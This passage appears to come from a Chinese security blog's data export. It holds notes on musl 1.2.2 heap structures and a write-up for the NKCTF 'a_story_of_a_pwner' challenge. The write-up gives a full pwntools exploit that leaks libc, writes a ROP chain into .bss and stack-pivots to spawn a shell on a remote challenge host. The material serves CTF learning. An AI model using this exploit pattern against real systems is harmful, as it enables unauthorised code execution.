(;;)</code>，</p>\n<ul>\n<li><p>如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk</p>\n<ul>\n<li>有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配</li>\n<li>无，break 跳出循环</li>\n</ul>\n</li>\n<li><p>跳出循环后执行<code>idx = alloc_slot(sc, n);alloc_slot</code>有三种分配方式:</p>\n<ul>\n<li><p><strong>使用group中被free的chunk</strong></p>\n</li>\n<li><p><strong>从队列中其他meta的group 中找</strong></p>\n</li>\n<li><p>如果都不行就重新分配一个新的group 对应一个新的meta</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk</p>\n</li>\n</ol>\n<h3 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h3><ol>\n<li><p>通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) </p>\n</li>\n<li><p>通过get_slot_index(p)得到对应chunk的 idx <code>-</code>&gt; 通过get_nominal_size(p, end) 算出真实大小</p>\n</li>\n<li><p>重置idx 和 offset idx 被置为``0xff<code> </code>标记chunk</p>\n</li>\n<li><p>修改freed_mask标记chunk被释放</p>\n</li>\n<li><p>最后调用nontrivial_free完成关于meta一些剩余操作 (注意进入nontrivial_free 是在<code>for</code>循环外 还未设置)</p>\n</li>\n</ol>\n<p><strong>注意</strong></p>\n<ol>\n<li><p>释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用</p>\n</li>\n<li><p>注意进入nontrivial_free 是在<code>for</code>循环外 还未设置freed_mask 跳出循环的条件是  <code>if (!freed || mask+self==all) break;</code></p>\n</li>\n<li><p>free中chunk的起始位置可以通过chunk的idx定位</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>musl而非glibc的堆，据说1.2.1和glibc很像，但从1.2.2之后和glibc差别很大，所以来看看1.2.2之后的。</p>","more":"<h2 id=\"基本数据结构\"><a href=\"#基本数据结构\" class=\"headerlink\" title=\"基本数据结构\"></a>基本数据结构</h2><p>在free或者malloc chunk的时候从chunk到group再到meta<strong>从小到大索引</strong></p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\"> <span class=\"type\">char</span> prev_user_data[];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> idx;  <span class=\"comment\">//低5bit为idx第几个chunk</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> offset; <span class=\"comment\">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！ UNIT=0x10</span></span><br><span class=\"line\">    <span class=\"type\">char</span> data[];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>在释放后 chunk 头的 <strong>idx会变成0xff offset 会清零</strong></p>\n<p>和glibc 的chunk 类似 glibc chunk 可以占用下一个chunk 的prev_size 空间</p>\n<p>而musl 可以使用 下一个chunk 头的<strong>低4B</strong> 来储存数据</p>\n<h3 id=\"group\"><a href=\"#group\" class=\"headerlink\" title=\"group\"></a>group</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNIT 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IB 4</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">meta</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> active_idx:<span class=\"number\">5</span>; <span class=\"comment\">//低5bit</span></span><br><span class=\"line\">    <span class=\"type\">char</span> pad[UNIT - <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> meta *) - <span class=\"number\">1</span>];<span class=\"comment\">//padding=0x10B UNIT=0x10</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> storage[];<span class=\"comment\">// chunks</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在musl 中<strong>同一类</strong>大小的chunk 都是被分配到 <strong>同一个</strong>group 中进行管理</li>\n<li>musl 是通过 <strong>chunk addr 和chunk 头对应的 offset</strong> 来索引到 group 地址的</li>\n<li>整体作为一个 group，其中开头的0x10我们当作group 头，这里的group头涵盖了第一个chunk的头数据，第一个chunk在这之后开始</li>\n<li>group开头的<strong>8个字节</strong>存的 meta 的地址，<strong>后面8个字节</strong>存了<strong>第一个chunk 的头数据 和 active_idx</strong></li>\n<li>这里active_idx 代表<strong>能存下</strong>的多少个可以用的同类型chunk（**[0,active_idx]，即active_idx+1个**）</li>\n</ul>\n<p>从<code>chunk</code>索引到<code>group</code>：<code>group_addr = chunk_addr - 0x10 * offset - 0x10</code></p>\n<h3 id=\"meta\"><a href=\"#meta\" class=\"headerlink\" title=\"meta\"></a>meta</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">prev</span>, *<span class=\"title\">next</span>;</span><span class=\"comment\">//双向链表</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> *<span class=\"title\">mem</span>;</span><span class=\"comment\">// 这里指向管理的group 地址</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"type\">int</span> avail_mask, freed_mask;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> last_idx:<span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> freeable:<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> sizeclass:<span class=\"number\">6</span>;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> maplen:<span class=\"number\">8</span>*<span class=\"keyword\">sizeof</span>(<span class=\"type\">uintptr_t</span>)<span class=\"number\">-12</span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>其中如果这个meta 前后都没有，那么它的prev next 就<strong>指向它自己</strong></p>\n<p><strong>avail_mask，freed_mask</strong> 是<strong>bitmap</strong>的形式体现 chunk 的状态</p>\n<ul>\n<li>在 avail_mask 中 2 进制的<strong>0表示不可分配1表示可分配</strong>，顺序是<strong>从后到前，最前面那个0不算，只是为了对齐</strong></li>\n<li>avail代表还<strong>未被分配</strong>出去，freed代表已经<strong>被分配但是被释放</strong>了</li>\n<li>如01111000 中最后的 3个0 ， 表示第1、2、3个 chunk 是不可分配的 前面4个chunk 是可以分配的</li>\n<li>在 free_mask 中的 <strong>1表示已经被释放</strong></li>\n</ul>\n<p><strong>last_idx</strong>可以表示最多<strong>可用堆块的数量</strong>，最多数量**=last_idx+1**(因为是从[0,last_idx])</p>\n<p><strong>freeable=1</strong>代表meta否<strong>可以被回收</strong>，freeable=0代表<strong>不可以</strong></p>\n<p><strong>sizeclass</strong>表示由哪个group进行管理这一类的大小的chunk</p>\n<p><strong>maplen&gt;= 1</strong>表示这个meta里的group是新mmap出来的，长度为<code>meta-&gt;maplen = (needed+4095)/4096</code>，并且这个group <strong>不在size_classes里</strong></p>\n<p><strong>maplen=0</strong>表示group 不是新mmap出来的<strong>在size_classes里</strong></p>\n<p><strong>tips:</strong></p>\n<ul>\n<li><strong>meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间</strong></li>\n<li><strong>由于bitmap的限制, 因此一个group中最多只能有32个chunk</strong></li>\n</ul>\n<h3 id=\"meta-arena\"><a href=\"#meta-arena\" class=\"headerlink\" title=\"meta_arena\"></a>meta_arena</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> check;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> nslots;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> <span class=\"title\">slots</span>[];</span> <span class=\"comment\">//管理的meta的地址</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>meta_area 是管理meta的合集，meta_area以<strong>页</strong>为单位分配 所以计算地址如下：</p>\n<p><code>const struct meta_area *area = (void* )((uintptr_t)meta &amp; -4096)</code></p>\n<p><strong>check</strong>:是个校验数字 保护meta_area 里的meta，<strong>防止meta被伪造</strong></p>\n<p><strong>meta_area *next</strong> 指向下一个meta_area 如果没有就<strong>默认为0</strong></p>\n<p><strong>nslots</strong>: meta槽的<strong>数量</strong></p>\n<p><strong>细节</strong>:在这个meta_area 页被使用的时候 上一个临近的页 会被设置为不可写</p>\n<h3 id=\"malloc-context\"><a href=\"#malloc-context\" class=\"headerlink\" title=\"malloc_context\"></a>malloc_context</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_context</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> secret;<span class=\"comment\">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> PAGESIZE</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> pagesize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"type\">int</span> init_done;<span class=\"comment\">//是否初始化标记</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> mmap_counter;<span class=\"comment\">// 记录有多少mmap 的内存的数量</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">free_meta_head</span>;</span><span class=\"comment\">// 被free的meta头 这里meta管理使用了队列和双向循环链表</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">avail_meta</span>;</span><span class=\"comment\">//指向可用meta数组</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">meta_area_head</span>, *<span class=\"title\">meta_area_tail</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *avail_meta_areas;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">active</span>[48];</span><span class=\"comment\">// 记录着可用的meta</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> u sage_by_class[<span class=\"number\">48</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> unmap_seq[<span class=\"number\">32</span>], bounces[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> seq;</span><br><span class=\"line\">    <span class=\"type\">uintptr_t</span> brk;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内存分配与释放\"><a href=\"#内存分配与释放\" class=\"headerlink\" title=\"内存分配与释放\"></a>内存分配与释放</h2><h3 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h3><ol>\n<li><p>若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta</p>\n</li>\n<li><p>关于找对应size的meta 这里有两种情况:</p>\n<ul>\n<li><p>如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta</p>\n</li>\n<li><p>如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:<code>for (;;)</code>，</p>\n<ul>\n<li><p>如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk</p>\n<ul>\n<li>有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配</li>\n<li>无，break 跳出循环</li>\n</ul>\n</li>\n<li><p>跳出循环后执行<code>idx = alloc_slot(sc, n);alloc_slot</code>有三种分配方式:</p>\n<ul>\n<li><p><strong>使用group中被free的chunk</strong></p>\n</li>\n<li><p><strong>从队列中其他meta的group 中找</strong></p>\n</li>\n<li><p>如果都不行就重新分配一个新的group 对应一个新的meta</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk</p>\n</li>\n</ol>\n<h3 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h3><ol>\n<li><p>通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) </p>\n</li>\n<li><p>通过get_slot_index(p)得到对应chunk的 idx <code>-</code>&gt; 通过get_nominal_size(p, end) 算出真实大小</p>\n</li>\n<li><p>重置idx 和 offset idx 被置为``0xff<code> </code>标记chunk</p>\n</li>\n<li><p>修改freed_mask标记chunk被释放</p>\n</li>\n<li><p>最后调用nontrivial_free完成关于meta一些剩余操作 (注意进入nontrivial_free 是在<code>for</code>循环外 还未设置)</p>\n</li>\n</ol>\n<p><strong>注意</strong></p>\n<ol>\n<li><p>释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用</p>\n</li>\n<li><p>注意进入nontrivial_free 是在<code>for</code>循环外 还未设置freed_mask 跳出循环的条件是  <code>if (!freed || mask+self==all) break;</code></p>\n</li>\n<li><p>free中chunk的起始位置可以通过chunk的idx定位</p>\n</li>\n</ol>"},{"title":"nkctf_a_story_of_a_pwner","date":"2023-03-26T14:12:09.000Z","_content":"\nnkctf的a_story_of_a_pwner，大哥的故事挺有意思的，题目也挺好做的。\n\n<!-- more -->\n\nheart里面有栈溢出(0x20-0xa)byte\n\nwarning可以直接leak libc\n\n先在acm,ctf,love里把ROP链写进bss段，之后栈迁移到这里gets shell\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so.6')\n# p=process('./'+filename)\np=remote('node.yuzhian.com.cn',36843)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef acm(content):\n    ru(\"> \\n\")\n    sl(\"1\")\n    ru(\"what's your comment?\\n\")\n    s(content)\n\ndef ctf(content):\n    ru(\"> \\n\")\n    sl(\"2\")\n    ru(\"what's your corment?\\n\")\n    s(content)\n\ndef love(content):\n    ru(\"> \\n\")\n    sl(\"3\")\n    ru(\"what's your corMenT?\\n\")\n    s(content)\n\ndef heart(content):\n    ru(\"> \\n\")\n    sl(\"4\")\n    ru(\"now, come and read my heart...\\n\")\n    s(content)\n\ndef warning():\n    ru(\"> \\n\")\n    sl(\"4\")\n    ru(\"I give it up, you can see this. \")\n    data=int(ru('\\n')[:-1],16)\n    return data\n\npop_rdi_ret=0x0000000000401573\nbss_addr=0x00000000004050A0\nleave_ret=0x000000000040139e\n\nputs_addr=warning()\nlibcbase=puts_addr-libc.sym['puts']\n\nleak('libcbase',hex(libcbase))\nsys_addr=libcbase+libc.sym['system']\nbinsh_addr=libcbase+libc.search(b\"/bin/sh\\x00\").__next__()\n\nctf(p64(pop_rdi_ret))\nacm(p64(binsh_addr))\nlove(p64(sys_addr))\npayload=b'a'*0xa+p64(bss_addr-0x8)+p64(leave_ret)\nheart(payload)\n\nitr()\n```\n\n","source":"_posts/nkctf_a_story_of_a_pwner.md","raw":"---\ntitle: nkctf_a_story_of_a_pwner\ndate: 2023-03-26 22:12:09\ncategories: \n- pwn_wp\ntags: \n- pwn\n- ROP\n---\n\nnkctf的a_story_of_a_pwner，大哥的故事挺有意思的，题目也挺好做的。\n\n<!-- more -->\n\nheart里面有栈溢出(0x20-0xa)byte\n\nwarning可以直接leak libc\n\n先在acm,ctf,love里把ROP链写进bss段，之后栈迁移到这里gets shell\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so.6')\n# p=process('./'+filename)\np=remote('node.yuzhian.com.cn',36843)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef acm(content):\n    ru(\"> \\n\")\n    sl(\"1\")\n    ru(\"what's your comment?\\n\")\n    s(content)\n\ndef ctf(content):\n    ru(\"> \\n\")\n    sl(\"2\")\n    ru(\"what's your corment?\\n\")\n    s(content)\n\ndef love(content):\n    ru(\"> \\n\")\n    sl(\"3\")\n    ru(\"what's your corMenT?\\n\")\n    s(content)\n\ndef heart(content):\n    ru(\"> \\n\")\n    sl(\"4\")\n    ru(\"now, come and read my heart...\\n\")\n    s(content)\n\ndef warning():\n    ru(\"> \\n\")\n    sl(\"4\")\n    ru(\"I give it up, you can see this. \")\n    data=int(ru('\\n')[:-1],16)\n    return data\n\npop_rdi_ret=0x0000000000401573\nbss_addr=0x00000000004050A0\nleave_ret=0x000000000040139e\n\nputs_addr=warning()\nlibcbase=puts_addr-libc.sym['puts']\n\nleak('libcbase',hex(libcbase))\nsys_addr=libcbase+libc.sym['system']\nbinsh_addr=libcbase+libc.search(b\"/bin/sh\\x00\").__next__()\n\nctf(p64(pop_rdi_ret))\nacm(p64(binsh_addr))\nlove(p64(sys_addr))\npayload=b'a'*0xa+p64(bss_addr-0x8)+p64(leave_ret)\nheart(payload)\n\nitr()\n```\n\n","slug":"nkctf_a_story_of_a_pwner","published":1,"updated":"2023-03-30T08:15:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag6004g5oud4sqq3j5o","content":"<p>nkctf的a_story_of_a_pwner，大哥的故事挺有意思的，题目也挺好做的。</p>\n<span id=\"more\"></span>\n\n<p>heart里面有栈溢出(0x20-0xa)byte</p>\n<p>warning可以直接leak libc</p>\n<p>先在acm,ctf,love里把ROP链写进bss段，之后栈迁移到这里gets shell</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">36843</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">acm</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your comment?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ctf</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your corment?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">love</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your corMenT?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">heart</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;now, come and read my heart...\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">warning</span>():</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;I give it up, you can see this. &quot;</span>)</span><br><span class=\"line\">    data=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000401573</span></span><br><span class=\"line\">bss_addr=<span class=\"number\">0x00000000004050A0</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x000000000040139e</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr=warning()</span><br><span class=\"line\">libcbase=puts_addr-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr=libcbase+libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>).__next__()</span><br><span class=\"line\"></span><br><span class=\"line\">ctf(p64(pop_rdi_ret))</span><br><span class=\"line\">acm(p64(binsh_addr))</span><br><span class=\"line\">love(p64(sys_addr))</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xa</span>+p64(bss_addr-<span class=\"number\">0x8</span>)+p64(leave_ret)</span><br><span class=\"line\">heart(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf的a_story_of_a_pwner，大哥的故事挺有意思的，题目也挺好做的。</p>","more":"<p>heart里面有栈溢出(0x20-0xa)byte</p>\n<p>warning可以直接leak libc</p>\n<p>先在acm,ctf,love里把ROP链写进bss段，之后栈迁移到这里gets shell</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight 